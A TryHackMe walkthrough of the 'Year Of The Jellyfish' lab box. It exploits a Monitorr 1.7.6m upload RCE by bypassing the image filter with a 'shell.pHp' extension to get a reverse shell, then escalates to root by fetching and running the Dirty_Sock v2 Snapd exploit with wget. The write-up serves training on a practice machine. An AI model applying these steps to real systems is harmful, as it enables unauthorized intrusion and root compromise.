🐙 TryHackMe — Year Of The Jellyfish Walkthrough

Difficulty: Hard | Platform: TryHackMe

🧠 Overview

This write-up covers the exploitation path of the YearOfTheJellyfish room on TryHackMe. The box involves web exploitation through Monitorr, bypassing upload restrictions, and privilege escalation using a known vulnerability in Snapd.
🛠️ Recon & Enumeration
1️⃣ Add Target to Hosts

After deploying the machine, the first step is to map its domain locally:

sudo nano /etc/hosts
# Add:
10.10.X.X robyns-petshop.thm

2️⃣ Port Scanning

A full Nmap scan revealed the following open ports:

nmap -sC -sV -Pn -T4 -p- 10.10.X.X

Main services discovered:

    443/tcp — HTTPS with a self-signed certificate

3️⃣ SSL Certificate Enumeration

Visiting https://robyns-petshop.thm, a browser warning appears due to a self-signed SSL cert. Viewing the certificate revealed three Subject Alternative Names (SANs):

    dev.robyns-petshop.thm

    beta.robyns-petshop.thm

    monitorr.robyns-petshop.thm

These were added to /etc/hosts.
🌐 Web Exploitation – Monitorr RCE
4️⃣ Inspecting Monitorr Subdomain

Navigating to https://monitorr.robyns-petshop.thm, we observed a Monitorr dashboard, version 1.7.6m.

According to GitHub, Monitorr is a web interface to monitor services and applications. Using searchsploit, two known vulnerabilities were found for this version:

    Authorization Bypass

    Remote Code Execution (RCE)

5️⃣ Attempt: Authorization Bypass

Navigating to:

/assets/config/_installation/_register.php

...resulted in a 403 Forbidden error. This vector was blocked.
6️⃣ Exploiting RCE via upload.php

RCE vector:

/assets/php/upload.php

An existing Python exploit script was used, but initially failed due to SSL issues. We patched the code by adding verify=False to the requests calls.

Next, the exploit failed silently. After examining the response, we discovered a cookie isHuman=1 must be set. Once this was added to headers, a new error appeared:

    shell.php is not an image

7️⃣ Bypassing File Upload Filters

To bypass the file upload filter, several techniques were attempted:

    Double extensions: shell.php.jpg

    Case-sensitive extension bypass: shell.pHp ← ✅ This succeeded!

Once uploaded, the payload landed in:

/assets/data/usrimg/shell.pHp

Switching to the listener, a reverse shell was established.
🧬 Privilege Escalation – Snapd Exploitation

With an initial foothold, we upgraded to a fully interactive shell and ran enumeration tools (linpeas.sh). A suspicious SUID binary named snap stood out.

Checking the version:

snap version

Searchsploit revealed a known privilege escalation vulnerability in this version (Snapd). The Dirty_Sock v2 exploit was used:

wget https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py
python3 dirty_sockv2.py

Successfully escalated to root. Retrieved the final flag from /root/root.txt.
🏁 Flags Captured

    ✅ user.txt — From user shell

    ✅ root.txt — After exploiting Snapd
